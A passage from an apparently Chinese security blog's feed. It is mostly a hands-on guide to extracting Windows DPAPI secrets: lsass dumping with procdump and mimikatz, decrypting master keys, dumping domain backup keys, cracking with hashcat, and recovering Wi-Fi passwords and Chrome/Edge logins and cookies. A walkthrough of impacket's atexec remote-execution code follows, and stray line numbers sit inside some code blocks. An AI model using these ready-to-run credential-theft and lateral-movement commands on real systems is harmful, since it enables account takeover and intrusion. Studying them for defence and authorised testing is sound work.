+<pre><code>python dpapi.py masterkey -t [域]/[用户名]:[密码]@[IP] -file [Master Key文件名]
+.\mimikatz &quot;dpapi::masterkey /in:[Master Key文件名] /dc:[域控域名] /rpc&quot; exit
+</code></pre>
+<h5 id="导出-lsass-内存获得明文用户-master-key">导出 lsass 内存获得明文用户 Master Key</h5>
+<p>使用 procdump 导出 lsass 的内存</p>
+<pre><code class="language-batch">.\procdump64 -accepteula -ma lsass.exe lsass.dump
+</code></pre>
+<p>使用 mimikatz，加载内存文件，导出明文 Master Key</p>
+<pre><code class="language-batch">.\mimikatz &quot;sekurlsa::minidump lsass.dump&quot; &quot;sekurlsa::dpapi&quot; exit
+</code></pre>
+<h5 id="密码解密用户-master-key">密码解密用户 Master Key</h5>
+<p>使用用户的密码解密用户 Master Key 还需要用户的 SID，SID 可以从存储用户 Master Key 的目录名字得到<br>
+如果用户在域环境中，用户 Master Key 目录中还会有一个 <code>BK-[域]</code> 的文件，可以从中提取 SID</p>
+<p>使用 impacket 解密用户 Master Key</p>
+<pre><code>python dpapi.py masterkey -file [Master Key文件名] -sid [SID] -password [用户密码]
+</code></pre>
+<p>mimikatz 解密域用户 Master Key 需要加 /protected 参数，还可以使用 SHA1 或者 NT 哈希解密</p>
+<pre><code class="language-batch">#工作组用户
+.\mimikatz &quot;dpapi::masterkey /in:[Master Key文件名] /sid:[SID] /password:[用户密码]&quot; exit
+.\mimikatz &quot;dpapi::masterkey /in:[Master Key文件名] /sid:[SID] /hash:[用户密码SHA1]&quot; exit
+
+#域用户
+.\mimikatz &quot;dpapi::masterkey /in:[Master Key文件名] /sid:[SID] /password:[用户密码] /protected&quot; exit
+.\mimikatz &quot;dpapi::masterkey /in:[Master Key文件名] /sid:[SID] /hash:[用户密码NT] /protect&quot; exit
+1234567
+</code></pre>
+<p>需要注意，在 Windows 10 或 11 使用微软账号登录的用户，不能直接用微软账号的密码解密用户 Master Key<br>
+需要使用微软账号的密码来解密微软账号的缓存文件，获得解密 Master Key 的密码</p>
+<p>微软账户的缓存文件位于：<code>C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\CloudAPCache\MicrosoftAccount\[账号ID]\Cache\CacheData</code></p>
+<p>可以使用 MadPassExt 计算 <a href="https://www.nirsoft.net/utils/microsoft_account_dpapi_password.html">Microsoft Account DPAPI Password Extractor</a></p>
+<h5 id="爆破用户-master-key-密码">爆破用户 Master Key 密码</h5>
+<p>如果没有用户的密码或哈希，可以尝试爆破密码，再使用密码解密</p>
+<p>Master Key 根据环境和系统版本有三种计算方式：local、domain1607-、domain1607+，后两者的区别在于是否安装 Windows 10 1607 更新，Windows 在 1607 后添加了 PBKDF2 用于密钥派生</p>
+<p>使用 john 获得哈希值</p>
+<pre><code>python DPAPImk2john.py -S [SID] -mk [Master Key文件名] -c [local,domain1607-,domain1607+]
+</code></pre>
+<p>也可以用 john 直接尝试密码是否正确，正确会输出 1</p>
+<pre><code>python DPAPImk2john.py -S [SID] -mk [Master Key文件名] -c [local,domain1607-,domain1607+] --password [用户密码]
+</code></pre>
+<p>使用 hashcat 和 rockyou 爆破</p>
+<pre><code class="language-powershell">.\hashcat -m 15900 -a 0 -D 2 hash.txt rockyou.txt
+</code></pre>
+<h5 id="域备份密钥解密用户-master-key">域备份密钥解密用户 Master Key</h5>
+<p>域备份密钥存储在 lsass 的内存中和 ntds.dit 中</p>
+<p>登录域控，获取备份私钥，保存为 pvk 文件</p>
+<pre><code>python dpapi.py backupkeys -t [域]/[用户名]:[密码]@[域控IP] --export
+.\mimikatz &quot;privilege::debug&quot; &quot;lsadump::backupkeys /system:[域控域名] /export&quot; exit
+</code></pre>
+<p>使用 DSInternals 离线使用 ntds.dit 和 BootKey 获取备份私钥，保存为 pvk 文件</p>
+<pre><code>Get-ADDBBackupKey -BootKey [bootKey 密钥] -DataBasePath ntds.dit | Save-DPAPIBlob -DirectoryPath .
+</code></pre>
+<p>解密用户 Master Key</p>
+<pre><code class="language-powershell">python dpapi.py masterkey -file [Master Key文件名] -pvk [PVK文件名]
+</code></pre>
+<h5 id="注册表解密系统-master-key">注册表解密系统 Master Key</h5>
+<p>获得系统 Master Key 的密钥需要用到注册表的 SYSTEM 和 SECURITY<br>
+SECURITY 中存储了加密的密钥，需要使用 BootKey 解密</p>
+<pre><code class="language-batch">reg save HKLM\SYSTEM SYSTEM
+reg save HKLM\SECURITY SECURITY
+12
+</code></pre>
+<p>获取加密 Master Key 的密钥，会得到 dpapi_machinekey 和 dpapi_userkey，分别解密非 User 目录下的系统 Master Key 和 User 目录下的系统 Master Key</p>
+<pre><code>python secretsdump.py -system SYSTEM -security SECURITY local
+.\mimikatz &quot;lsadump::secrets /system:SYSTEM /security:SECURITY&quot; exit
+</code></pre>
+<p>解密系统 Master Key</p>
+<pre><code>python dpapi.py masterkey -file [系统Master Key路径] -key [dpapi_machinekey]
+python dpapi.py masterkey -file [系统Master Key路径] -key [dpapi_userkey]
+12
+</code></pre>
+<p>或者直接让 dpapi.py 读取 SYSTEM 和 SECURITY，自动解密</p>
+<pre><code>python dpapi.py masterkey -file [Master Key文件名] -system SYSTEM -security SECURITY
+</code></pre>
+<h3 id="blob">Blob</h3>
+<p>Blob 即是使用 DPAPI 加密后的数据，被 Master key 加密；<br>
+如果用户没有设置额外的密码，那么使用明文的 Master Key，就可以直接解密;</p>
+<p>任何被DPAPI加密后的数据都可以叫做Blob；</p>
+<p><strong>常用命令</strong></p>
+<pre><code>python dpapi.py unprotect -file [DPAPI Blob文件名] -key [解密后的Master Key（0x开头）]
+python dpapi.py unprotect -file [DPAPI Blob文件名] -key [解密后的Master Key（0x开头）] -entropy [额外的密码]
+12
+.\mimikatz &quot;dpapi::blob /in:[DPAPI Blob文件名] /masterkey:[解密后的Master Key（无0x开头）] /unp
+</code></pre>
+<h3 id="credential">Credential</h3>
+<p>Credential 负责管理凭据管理器中的 Windows 凭据；<br>
+<img src="https://iceberg-n.github.io/post-images/1699945581162.png" alt="" loading="lazy"></p>
+<p>Windows 凭据及保存RDP账号密码；<br>
+<img src="https://iceberg-n.github.io/post-images/1699945591697.png" alt="" loading="lazy"></p>
+<p>普通凭据分为本地凭据和企业凭据，可以在详情密码查看；<br>
+<img src="https://iceberg-n.github.io/post-images/1699945607606.png" alt="" loading="lazy"></p>
+<p><strong>Credential存储路径</strong></p>
+<ol>
+<li>
+<p>凭据存储地址(User Master Key)：<code>%UserProfile%\AppData\Local\Microsoft\Credentials</code>(保存windows凭据和普通凭据中的本地凭据)</p>
+</li>
+<li>
+<p>凭据存储地址(User Master Key)：<code>%UserProfile%\AppData\Roaming\Microsoft\Credentials</code>(保存基于证书的凭据和普通凭据中的企业凭据)</p>
+</li>
+</ol>
+<p><strong>常用命令</strong></p>
+<ul>
+<li>impacket</li>
+</ul>
+<pre><code class="language-powershell">python dpapi.py credential -file [Credentials文件名] -key [解密后的Master Key（0x开头）]
+</code></pre>
+<ul>
+<li>mimikatz</li>
+</ul>
+<pre><code>.\mimikatz &quot;dpapi::cred /in:[Credentials文件名] /masterkey:[解密后的Master Key（无0x开头）]&quot; exit
+</code></pre>
+<h3 id="vault">Vault</h3>
+<p>Vault 负责管理凭据管理器中的 Web 凭据<br>
+<img src="https://iceberg-n.github.io/post-images/1699945620298.png" alt="" loading="lazy"></p>
+<p>Windows Vault 保存的凭据存储在 vcrd 文件中，vcrd 文件使用 vpol 文件中的密钥进行 AES-CBC 加密，而 vpol 文件又被 Master Key 加密；</p>
+<p><strong>Vault 存储目录</strong></p>
+<ol>
+<li>
+<p><code>%UserProfile%\AppData\Local\Microsoft\Vault</code>：保存 Web 凭据，由用户 Master Key 加密</p>
+</li>
+<li>
+<p><code>C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Vault</code>：保存 Windows 生物特征密钥，由 User 目录下的系统 Master Key 加密</p>
+</li>
+<li>
+<p><code>C:\ProgramData\Microsoft\Vault</code>：由 User 目录下的系统 Master Key 加密</p>
+</li>
+</ol>
+<p><strong>常用命令</strong></p>
+<ul>
+<li>
+<p>impacket</p>
+<p>dpapi解密 vpol 文件，得到 AES128 和 AES256 两个密钥</p>
+</li>
+</ul>
+<pre><code>python dpapi.py vault -vpol [VPOL文件名] -key [解密后的Master Key（0x开头）]
+</code></pre>
+<p>​		再使用 AES 密钥解密 vcrd 文件，一般使用 AES256</p>
+<pre><code>python dpapi.py vault -vcrd [VCRD文件名] -key [AES密钥]
+</code></pre>
+<ul>
+<li>mimikatz</li>
+</ul>
+<pre><code>.\mimikatz &quot;dpapi::vault /cred:[VCRD文件名] /policy:[VPOL文件名] /masterkey:[解密后的Master Key（无0x开
+</code></pre>
+<h3 id="credhist">Credhist</h3>
+<p>Credhist 负责保存用户的历史密码哈希，避免修改用户密码后， Master Key 就无法解密了;<br>
+每当用户修改密码时，老密码就会被添加到 Credhist 中，并使用新密码加密，因此有了新用户密码（或者哈希）就可以得到历史密码哈希;</p>
+<p>如何修改密码，这里存在几种情况：</p>
+<ol>
+<li>
+<p>使用命令行修改密码（net user）：不会写入 Credhist，无法解密之前的 Master Key</p>
+</li>
+<li>
+<p>使用 lusrmgr.msc 修改密码：不会写入 Credhist，无法解密之前的 Master Key</p>
+</li>
+<li>
+<p>使用 GUI 修改密码（Windows 会询问当前密码）：会写入 Credhist，可以解密之前的 Master Key</p>
+</li>
+</ol>
+<p><strong>Credhist存储位置</strong></p>
+<p><code>%UserProfile%\AppData\Roaming\Microsoft\Protect</code></p>
+<figure data-type="image" tabindex="1"><img src="https://iceberg-n.github.io/post-images/1699945644300.png" alt="" loading="lazy"></figure>
+<p><strong>常用命令</strong></p>
+<ul>
+<li>mimikatz</li>
+</ul>
+<pre><code>.\mimikatz &quot;dpapi::credhist /in:[CREDHIST文件名] /sid:[SID] /password:[新用户密码]&quot; exit
+.\mimikatz &quot;dpapi::credhist /in:[CREDHIST文件名] /sid:[SID] /sha1:[新用户密码哈希]&quot; exit
+</code></pre>
+<h3 id="preferred">Preferred</h3>
+<p>Preferred 负责存储了目前正在使用的 Master Key 的 GUID 以及过期时间，前 16 字节是 Master Key 的 GUID，后 8 字节是过期时间；</p>
+<p>系统每隔90天会自动生成新的Master Key，旧的不会删除；</p>
+<p><strong>Preferred 存储位置</strong></p>
+<ul>
+<li>
+<p>用户Master Key的Prefered存储地址：<code>%UserProfile%\AppData\Roaming\Microsoft\Protect\[SID]\Preferred</code></p>
+</li>
+<li>
+<p>系统Master Key的Prefered存储地址：<code>C:\Windows\System32\Microsoft\Protect\S-1-5-18</code>和<code>C:\Windows\System32\Microsoft\Protect\S-1-5-18\User</code></p>
+</li>
+</ul>
+<h3 id="cryptoapi">CryptoAPI</h3>
+<p>CryptoAPI 负责存储使用的 RSA 私钥</p>
+<p><strong>CryptoAPI存储地址</strong></p>
+<p>由User Master Key加密</p>
+<p><code>%UserProfile%\AppData\Roaming\Microsoft\Crypto\RSA\[SID]</code></p>
+<p><strong>常用命令</strong></p>
+<pre><code class="language-batch">.\mimikatz &quot;dpapi::capi /in:[私钥文件] /masterkey:[解密后的Master Key（无0x开头）] /unprotect&quot; exit
+</code></pre>
+<h3 id="cng">CNG</h3>
+<p>CNG 负责存储使用的私钥存储目录：</p>
+<p><strong>CNG存储地址</strong></p>
+<p><code>%UserProfile%\AppData\Roaming\Microsoft\Crypto\Keys</code></p>
+<p>由User Master Key 加密</p>
+<p><strong>常用命令</strong></p>
+<pre><code class="language-batch">.\mimikatz &quot;dpapi::cng /in:[私钥文件] /masterkey:[解密后的Master Key（无0x开头）] /unprotect&quot; exit
+</code></pre>
+<h3 id="wlan-凭据">WLAN 凭据</h3>
+<h4 id="个人">个人</h4>
+<p>个人 WLAN 的密码存储位置：</p>
+<ul>
+<li><code>C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{GUID}\{GUID}.xml</code></li>
+</ul>
+<p>在线可以这样输出密码</p>
+<pre><code class="language-batch">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in ('netsh wlan show profiles') do @echo%j | findstr -i -v echo | netsh wlan show profiles %j key=clear
+</code></pre>
+<p>由 User 目录下的系统 Master Key 加密</p>
+<pre><code class="language-batch">.\mimikatz &quot;dpapi::wifi /in:[XML文件名] /masterkey:[解密后的Master Key（无0x开头）] /unprotect&quot; exit
+</code></pre>
+<h4 id="企业">企业</h4>
+<p>企业 WLAN 的密码存储位置：</p>
+<ul>
+<li><code>HKCU\Software\Microsoft\Wlansvc\UserData\Profiles\{GUID}\MSMUserData</code></li>
+<li><code>HKEY_USERS\[SID]\Software\Microsoft\Wlansvc\UserData\Profiles\{GUID}\MSMUserData</code></li>
+</ul>
+<p>MSMUserData 是 DPAPI Blob，由 User 目录下的系统 Master Key 加密</p>
+<pre><code class="language-powershell">python dpapi.py unprotect -file MSMUserData.dat -key [解密后的Master Key（0x开头）]
+</code></pre>
+<p>解密后，可以直接得到用户名，如果用户名前面为 <code>0400000002000000</code>，则密码还需要进一步解密，如果前面为 <code>0300000020000000</code>，则密码已经是明文</p>
+<p>如果需要进一步解密密码，加密的密码为 <code>01000000d08c9ddf01</code> 开头，一直到末尾<br>
+加密的密码也是 DPAPI Blob，使用用户 Master Key 加密</p>
+<p>但貌似 impacket 解不开，mimikatz 可以</p>
+<pre><code class="language-batch">.\mimikatz &quot;dpapi::blob /in:pass.dat /masterkey:[解密后的Master Key（无0x开头）] /unprotect&quot; exit
+</code></pre>
+<h3 id="chrome-凭据-cookie">Chrome 凭据 &amp; Cookie</h3>
+<p>Chrome 的相关文件位置：</p>
+<ul>
+<li>数据目录：<code>%UserProfile%\AppData\Local\Google\Chrome\User Data</code></li>
+<li>密钥文件：<code>Local State</code></li>
+<li>历史记录：<code>Default\History</code></li>
+<li>保存的登录凭据数据库：<code>Default\Login Data</code></li>
+<li>Cookie 数据库：<code>Default\Network\Cookies</code></li>
+</ul>
+<p>保存的登录凭据和 Cookie 被 AES-GCM 加密，加密密钥存储在 Local State 的 encrypted_key 中<br>
+而 encrypted_key 是 DPAPI Blob，由用户 Master Key 加密</p>
+<p>先从 Local State 提取出 encrypted_key，Base64 解码，去掉前面的 DPAPI 前缀</p>
+<p>解密，得到 AES 密钥</p>
+<pre><code>python dpapi.py unprotect -file encrypted_key.dat -key [解密后的Master Key（0x开头）]
+</code></pre>
+<p>按照 SQLite 格式打开 Login Data 或者 Cookies，找到 v10 开头的数据，即为 AES 加密数据</p>
+<p>加密数据的格式如下：</p>
+<ul>
+<li><code>encrypted[:3]</code>：v10，表明是 Chrome 80 以上版本</li>
+<li><code>encrypted[3:15]</code>：AES IV</li>
+<li><code>encrypted[15:-16]</code>：AES 加密数据</li>
+<li><code>encrypted[-16:]</code>：AES GCM Tag</li>
+</ul>
+<p>使用 AES 密钥以及上面的参数即可解密</p>
+<h3 id="edge-凭据-cookie">Edge 凭据 &amp; Cookie</h3>
+<p>数据目录：<code>%UserProfile%\AppData\Local\Microsoft\Edge\User Data</code></p>
+<p>其他同 Chrome</p>
+<h2 id="代码分析">代码分析</h2>
+<p>该脚本可以解密5种密钥，分别为masterkey、backupkeys、credential、vault、unprotect；</p>
+<h3 id="masterkey">masterkey</h3>
+<p>先分析masterkey解密，分为离线和在线；</p>
+<h4 id="离线">离线</h4>
+<h4 id="在线">在线</h4>
+<p>transport.DCERPCTransportFactory()创建DCE/RPC传输对象；</p>
+<p>pctransport.set_credentials()设置凭据；</p>
+<p>rpctransport.get_dce_rpc()获取DCE/RPC传输对象；</p>
+<p>访问接口为&quot;\PIPE\protected_storage&quot;；</p>
+<pre><code class="language-PYTHON">rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\PIPE\protected_storage]' % remoteName)
+
+if hasattr(rpctransport, 'set_credentials'):
+    # This method exists only for selected protocol sequences.
+    rpctransport.set_credentials(username, password, domain, lmhash, nthash, self.options.aesKey)
+
+rpctransport.set_kerberos(self.options.k, self.options.dc_ip)
+
+dce = rpctransport.get_dce_rpc()
+dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+if self.options.k is True:
+    dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+</code></pre>
+<p>dce.connect()创建RPC连接；</p>
+<p>dce.bind()进行RPC绑定；</p>
+<pre><code class="language-PYTHON">dce.connect()
+dce.bind(bkrp.MSRPC_UUID_BKRP, transfer_syntax = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0'))
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945676324.png" alt="" loading="lazy"></p>
+<p>bkrp.BackuprKey()格式化请求内容；</p>
+<p>dce.request()发起请求；</p>
+<pre><code class="language-PYTHON">request = bkrp.BackuprKey()
+request['pguidActionAgent'] = bkrp.BACKUPKEY_RESTORE_GUID
+request['pDataIn'] = dk.getData()
+request['cbDataIn'] = len(dk.getData())
+request['dwParam'] = 0
+
+resp = dce.request(request)
+</code></pre>
+<p>通过提取结果中的ppDataOut，提取出masterkey</p>
+<pre><code class="language-PYTHON">beginning=0
+for i in range(len(resp['ppDataOut'])):
+    if resp['ppDataOut'][i]==b'\x00':
+        beginning+=1
+    else:
+        break
+masterkey=b''.join(resp['ppDataOut'][beginning:])
+print('Decrypted key using rpc call')
+print('Decrypted key: 0x%s' % hexlify(masterkey).decode())
+return
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945685983.png" alt="" loading="lazy"></p>
+<h3 id="backupkeys">BACKUPKEYS</h3>
+<p>SMBConnection()创建SMB连接；</p>
+<p>connection.logon()进行SMB认证；</p>
+<pre><code class="language-PYTHON">connection = SMBConnection(address, address)
+if self.options.k:
+    connection.kerberosLogin(username, password, domain, lmhash, nthash, self.options.aesKey)
+else:
+    connection.login(username, password, domain, lmhash=lmhash, nthash=nthash)
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945697839.png" alt="" loading="lazy"></p>
+<p>transport.DCERPCTransportFactory()创建DCE/RPC通信；</p>
+<p>rpctransport.set_smb_connection()重新建立SMB通信；</p>
+<p>rpctransport.get_dce_rpc()获取DCE/RPC通道；</p>
+<p>dce.connect()进行连接；</p>
+<p>dce.bind()进行RPC绑定；</p>
+<pre><code class="language-PYTHON">rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\lsarpc]')
+rpctransport.set_smb_connection(connection)
+dce = rpctransport.get_dce_rpc()
+if self.options.k:
+    dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+try:
+    dce.connect()
+    dce.bind(lsad.MSRPC_UUID_LSAD)
+except transport.DCERPCException as e:
+    raise e
+</code></pre>
+<p>对应流量如下：<br>
+<img src="https://iceberg-n.github.io/post-images/1699945706621.png" alt="" loading="lazy"></p>
+<p>for循环进行lsad.hLsarRetrievePrivateData()进行hLsarRetrievePrivateData请求，获取私有数据G$BCKUPKEY_PREFERRED；获取guid后继续hLsarRetrievePrivateData请求，获取私有数据；</p>
+<pre><code class="language-PYTHON">for keyname in (&quot;G$BCKUPKEY_PREFERRED&quot;, &quot;G$BCKUPKEY_P&quot;):
+    buffer = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce,
+                                  resp['PolicyHandle'], keyname))
+    guid = bin_to_string(buffer)
+    name = &quot;G$BCKUPKEY_{}&quot;.format(guid)
+    secret = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce,
+                                  resp['PolicyHandle'], name))
+    keyVersion = struct.unpack('&lt;L', secret[:4])[0]
+</code></pre>
+<p>一次循环需要hLsarRetrievePrivateData请求两次所以流量中应看到4此hLsarRetrievePrivateData通信，对应流量如下：</p>
+<figure data-type="image" tabindex="2"><img src="https://iceberg-n.github.io/post-images/1699945713837.png" alt="" loading="lazy"></figure>
+<h3 id="credential-2">CREDENTIAL</h3>
+<h2 id="总结">总结</h2>
+<h3 id="更改smb协商版本">更改SMB协商版本</h3>
+<p>SMB协议设置为V2.1</p>
+<p>查看当前impacket包的路径</p>
+<pre><code>import impacket
+print(impacket.__file__)
+</code></pre>
+<p>在impacket\smbconnection.py 50行，将None更改为SMB2_DIALECT_21即可;<br>
+<img src="https://iceberg-n.github.io/post-images/1699945726556.png" alt="" loading="lazy"></p>
+<p>参考文章：</p>
+<p>https://john-doe.icu/dpapi-1/<br>
+https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[impacket解读 -- atexec浅析]]></title>
+        <id>https://iceberg-n.github.io/post/impacket-jie-du-atexec-qian-xi/</id>
+        <link href="https://iceberg-n.github.io/post/impacket-jie-du-atexec-qian-xi/">
+        </link>
+        <updated>2023-11-12T11:44:54.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="atexec-浅析">atexec 浅析</h1>
+<hr>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="atexec-浅析">atexec 浅析</h1>
+<hr>
+<!-- more -->
+<h2 id="测试环境">测试环境</h2>
+<p><strong>作用：</strong> 利用计划任务组件进行命令执行；</p>
+<p><strong>方式：</strong> SMB协议，NamePipe\atsvc接口；</p>
+<p><strong>内网环境</strong></p>
+<ol>
+<li>DC(域控)：192.168.1.137</li>
+<li>WIN10(攻击机)：192.168.1.129</li>
+<li>WIN7(被攻击机)：192.168.1.148</li>
+</ol>
+<p><strong>执行测试命令</strong></p>
+<pre><code>python atexec.py domain.local/administrator:&quot;Admin@123&quot;@192.168.1.137 whoami
+</code></pre>
+<h2 id="代码解析">代码解析</h2>
+<p>transport.DCERPCTransportFactory()创建DCE/RPC传输对象，进入self.doStuff()；</p>
+<pre><code class="language-python">stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % addr
+        rpctransport = transport.DCERPCTransportFactory(stringbinding)
+
+        if hasattr(rpctransport, 'set_credentials'):
+            # This method exists only for selected protocol sequences.
+            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                                         self.__aesKey)
+            rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
+        try:
+            self.doStuff(rpctransport)
+        except Exception as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.error(e)
+            if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') &gt;=0:
+                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')
+</code></pre>
+<!-- more -->
+<!-- more -->
+<p>rpctransport.get_dce_rpc()获取DCE/RPC传输对象；</p>
+<p>dce.set_credentials()设置验证凭据；</p>
+<p>dce.connect()建立RPC连接(SMB协议)；</p>
+<pre><code class="language-PYTHON">dce = rpctransport.get_dce_rpc()
+dce.set_credentials(*rpctransport.get_credentials())
+if self.__doKerberos is True:
+    dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+dce.connect()
+</code></pre>
+<p>此处代码对应的流量如下：</p>
+<figure data-type="image" tabindex="1"><img src="https://iceberg-n.github.io/post-images/1699789555456.png" alt="" loading="lazy"></figure>
+<!-- more -->
+<!-- more -->
+<p>dce.set_auth_level()设置通信加密级别；</p>
+<p>dce.bind()rpc绑定请求；</p>
+<pre><code class="language-python">dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+dce.bind(tsch.MSRPC_UUID_TSCHS)
+</code></pre>
+<p>对应流量如下：</p>
+<figure data-type="image" tabindex="2"><img src="https://iceberg-n.github.io/post-images/1699789566906.png" alt="" loading="lazy"></figure>
+<p>设置计划任务模板，在模板中设置我们传入的命令，并将执行后的结果保存至<code>%windir%\temp\</code>8位随机文件名的tmp文件；</p>
+<pre><code class="language-PYTHON">tmpName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
+        tmpFileName = tmpName + '.tmp'
+
+        if self.sessionId is not None:
+            cmd, args = cmd_split(self.__command)
+        else:
+            cmd = &quot;cmd.exe&quot;
+            args = &quot;/C %s &gt; %%windir%%\\Temp\\%s 2&gt;&amp;1&quot; % (self.__command, tmpFileName)
+
+        xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;
+&lt;Task version=&quot;1.2&quot; xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;&gt;
+  &lt;Triggers&gt;
+    &lt;CalendarTrigger&gt;
+      &lt;StartBoundary&gt;2015-07-15T20:35:13.2757294&lt;/StartBoundary&gt;
+      &lt;Enabled&gt;true&lt;/Enabled&gt;
+      &lt;ScheduleByDay&gt;
+        &lt;DaysInterval&gt;1&lt;/DaysInterval&gt;
+      &lt;/ScheduleByDay&gt;
+    &lt;/CalendarTrigger&gt;
+  &lt;/Triggers&gt;
+  &lt;Principals&gt;
+    &lt;Principal id=&quot;LocalSystem&quot;&gt;
+      &lt;UserId&gt;S-1-5-18&lt;/UserId&gt;
+      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;
+    &lt;/Principal&gt;
+  &lt;/Principals&gt;
+  &lt;Settings&gt;
+    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;
+    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;
+    &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;
+    &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;
+    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;
+    &lt;IdleSettings&gt;
+      &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;
+      &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;
+    &lt;/IdleSettings&gt;
+    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;
+    &lt;Enabled&gt;true&lt;/Enabled&gt;
+    &lt;Hidden&gt;true&lt;/Hidden&gt;
+    &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;
+    &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;
+    &lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;
+    &lt;Priority&gt;7&lt;/Priority&gt;
+  &lt;/Settings&gt;
+  &lt;Actions Context=&quot;LocalSystem&quot;&gt;
+    &lt;Exec&gt;
+      &lt;Command&gt;%s&lt;/Command&gt;
+      &lt;Arguments&gt;%s&lt;/Arguments&gt;
+    &lt;/Exec&gt;
+  &lt;/Actions&gt;
+&lt;/Task&gt;
+        &quot;&quot;&quot; % ((xml_escape(cmd) if self.__silentCommand is False else self.__command.split()[0]), 
+            (xml_escape(args) if self.__silentCommand is False else &quot; &quot;.join(self.__command.split()[1:])))
+</code></pre>
+<!-- more -->
+<!-- more -->
+<p>tsch.hSchRpcRegisterTask()创建计划任务；</p>
+<p>tsch.hSchRpcRun()运行计划任务；</p>
+<p>tsch.hSchRpcGetLastRunInfo()查看计划任务执行情况；</p>
+<p>tsch.hSchRpcDelete()删除计划任务；</p>
+<pre><code class="language-python">try:
+    logging.info('Creating task \\%s' % tmpName)
+    tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
+    taskCreated = True
+
+    logging.info('Running task \\%s' % tmpName)
+    done = False
+
+    if self.sessionId is None:
+        tsch.hSchRpcRun(dce, '\\%s' % tmpName)
+    else:
+        try:
+            tsch.hSchRpcRun(dce, '\\%s' % tmpName, flags=tsch.TASK_RUN_USE_SESSION_ID, sessionId=self.sessionId)
+        except Exception as e:
+            if str(e).find('ERROR_FILE_NOT_FOUND') &gt;= 0 or str(e).find('E_INVALIDARG') &gt;= 0 :
+                logging.info('The specified session doesn\'t exist!')
+                done = True
+            else:
+                raise
+
+    while not done:
+        logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
+        resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
+        if resp['pLastRuntime']['wYear'] != 0:
+            done = True
+        else:
+            time.sleep(2)
+
+    logging.info('Deleting task \\%s' % tmpName)
+    tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
+    taskCreated = False
+except tsch.DCERPCSessionError as e:
+    logging.error(e)
+    e.get_packet().dump()
+finally:
+    if taskCreated is True:
+        tsch.hSchRpcDelete(dce, '\\%s' % tmpName)
+</code></pre>
+<p>对应流量如下：</p>
+<figure data-type="image" tabindex="3"><img src="https://iceberg-n.github.io/post-images/1699789577621.png" alt="" loading="lazy"></figure>
+<!-- more -->
+<!-- more -->
+<p>rpctransport.get_smb_connection()创建新的SMB连接；</p>
+<p>smbConnection.getFile()读取文件ADMIN<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \Temp at position 1: \̲T̲e̲m̲p̲\下的8位随机字符的tmp文件…'>\Temp\下的8位随机字符的tmp文件(Admin</span>对应主机的<code>C:\windows\</code>目录)；</p>
+<p>smbConnection.deleteFile()删除该tmp文件；</p>
+<pre><code class="language-PYTHON">smbConnection = rpctransport.get_smb_connection()
+waitOnce = True
+while True:
+    try:
+        logging.info('Attempting to read ADMIN$\\Temp\\%s' % tmpFileName)
+        smbConnection.getFile('ADMIN$', 'Temp\\%s' % tmpFileName, output_callback)
+        break
+    except Exception as e:
+        if str(e).find('SHARING') &gt; 0:
+            time.sleep(3)
+        elif str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') &gt;= 0:
+            if waitOnce is True:
+                # We're giving it the chance to flush the file before giving up
+                time.sleep(3)
+                waitOnce = False
+            else:
+                raise
+        else:
+            raise
+logging.debug('Deleting file ADMIN$\\Temp\\%s' % tmpFileName)
